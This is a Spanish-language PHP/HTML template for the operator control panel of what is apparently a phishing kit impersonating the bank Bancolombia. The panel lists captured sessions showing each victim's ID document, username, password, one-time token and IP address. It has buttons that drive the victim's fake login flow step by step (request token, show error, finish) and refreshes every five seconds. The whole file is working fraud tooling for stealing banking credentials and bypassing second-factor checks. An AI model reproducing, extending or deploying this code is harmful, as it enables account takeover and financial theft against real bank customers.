<?php
/**
 * Template: Panel de Control
 * Variables disponibles: $activeSessions (array de Session objects)
 */
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>Panel de Control - Bancolombia</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); min-height: 100vh; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); padding: 20px; border-radius: 15px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .header h1 { color: white; font-size: 24px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: rgba(255,255,255,0.15); backdrop-filter: blur(10px); padding: 20px; border-radius: 12px; color: white; }
        .stat-card h3 { font-size: 14px; margin-bottom: 10px; opacity: 0.9; }
        .stat-card .value { font-size: 32px; font-weight: bold; }
        .sessions { background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); border-radius: 15px; padding: 25px; overflow-x: auto; }
        .sessions h2 { margin-bottom: 20px; color: #1e3c72; }
        table { width: 100%; border-collapse: collapse; min-width: 800px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #e0e0e0; white-space: nowrap; }
        th { background: #f5f5f5; font-weight: 600; color: #333; position: sticky; top: 0; }
        .btn { padding: 6px 12px; margin: 2px; border: none; border-radius: 5px; cursor: pointer; font-size: 12px; white-space: nowrap; }
        .btn-danger { background: #e74c3c; color: white; }
        .btn-success { background: #27ae60; color: white; }
        .btn-warning { background: #f39c12; color: white; }
        .btn-info { background: #3498db; color: white; }
        
        @media (max-width: 768px) {
            body { padding: 10px; }
            .header h1 { font-size: 18px; }
            .stats { grid-template-columns: repeat(2, 1fr); gap: 10px; }
            .stat-card { padding: 15px; }
            .stat-card .value { font-size: 24px; }
            .sessions { padding: 15px; border-radius: 10px; }
            th, td { padding: 8px; font-size: 13px; }
            .btn { padding: 5px 8px; font-size: 11px; margin: 1px; }
        }
        
        @media (max-width: 480px) {
            .header { padding: 15px; }
            .header h1 { font-size: 16px; }
            .stats { grid-template-columns: 1fr; gap: 8px; }
            .stat-card { padding: 12px; }
            .stat-card h3 { font-size: 13px; }
            .stat-card .value { font-size: 20px; }
            .sessions { padding: 12px; }
            .sessions h2 { font-size: 18px; }
            th, td { padding: 6px; font-size: 12px; }
            .btn { padding: 4px 6px; font-size: 10px; display: block; width: 100%; margin-bottom: 2px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 Panel de Control - Bancolombia</h1>
            <div style="color: white;"><?= date('H:i:s') ?></div>
        </div>

        <div class="stats">
            <div class="stat-card">
                <h3>Sesiones Activas</h3>
                <div class="value"><?= count($activeSessions) ?></div>
            </div>
            <div class="stat-card">
                <h3>Con Documento</h3>
                <div class="value"><?= count(array_filter($activeSessions, fn($s) => $s->getDocumentNumber() !== null)) ?></div>
            </div>
            <div class="stat-card">
                <h3>Con Credenciales</h3>
                <div class="value"><?= count(array_filter($activeSessions, fn($s) => $s->getUsuario() !== null)) ?></div>
            </div>
            <div class="stat-card">
                <h3>Con Token</h3>
                <div class="value"><?= count(array_filter($activeSessions, fn($s) => $s->getToken() !== null)) ?></div>
            </div>
        </div>

        <div class="sessions">
            <h2>📊 Sesiones Activas</h2>
            
            <?php if (empty($activeSessions)): ?>
                <p>No hay sesiones activas en este momento.</p>
            <?php else: ?>
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Documento</th>
                            <th>Usuario</th>
                            <th>Clave</th>
                            <th>Token</th>
                            <th>IP</th>
                            <th>Stage</th>
                            <th>Hora</th>
                            <th>Acciones</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($activeSessions as $session): ?>
                            <tr>
                                <td><?= htmlspecialchars($session->getShortId()) ?></td>
                                <td>
                                    <?php if ($session->getDocumentType()): ?>
                                        <?= htmlspecialchars($session->getDocumentType()) ?>: <?= htmlspecialchars($session->getDocumentNumber()) ?>
                                    <?php else: ?>
                                        -
                                    <?php endif; ?>
                                </td>
                                <td><?= htmlspecialchars($session->getUsuario() ?? '-') ?></td>
                                <td><?= htmlspecialchars($session->getClave() ?? '-') ?></td>
                                <td><?= htmlspecialchars($session->getToken() ?? '-') ?></td>
                                <td><?= htmlspecialchars($session->getIp() ?? '-') ?></td>
                                <td><?= htmlspecialchars($session->getStage() ?? '-') ?></td>
                                <td><?= htmlspecialchars($session->getFormattedTime()) ?></td>
                                <td>
                                    <button class="btn btn-danger" onclick="sendAction('<?= $session->getId() ?>', 'error_documento')">❌ Error Doc</button>
                                    <button class="btn btn-success" onclick="sendAction('<?= $session->getId() ?>', 'pedir_logo')">✅ Pedir Logo</button>
                                    <button class="btn btn-warning" onclick="sendAction('<?= $session->getId() ?>', 'error_logo')">❌ Error Logo</button>
                                    <button class="btn btn-info" onclick="sendAction('<?= $session->getId() ?>', 'pedir_token')">🔑 Token</button>
                                    <button class="btn btn-success" onclick="sendAction('<?= $session->getId() ?>', 'finalizar')">🏁 Fin</button>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php endif; ?>
        </div>
    </div>

    <script>
        function sendAction(sessionId, action) {
            fetch('/panel-handler.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, action })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.success ? '✅ Acción enviada' : '❌ Error: ' + data.message);
                if (data.success) location.reload();
            });
        }
        
        // Auto-refresh cada 5 segundos
        setTimeout(() => location.reload(), 5000);
    </script>
</body>
</html>
